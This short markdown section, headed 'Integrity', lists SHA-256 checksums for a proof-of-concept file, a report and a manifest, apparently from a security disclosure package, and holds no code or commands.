## Integrity

* PoC SHA-256: `25b7d94823d93a2cd75fc3da2184f6af221c485b56923eb81ec987d837260de8`
* Report SHA-256: `6d12f0604268d20117c62a515edd800627eb3276646b692915dd65e629d868f5`
* Manifest SHA-256: `ead1375fcd231df6702409a5dd6fed3e25797e8dbd7f072c0e4fc82def490e41`
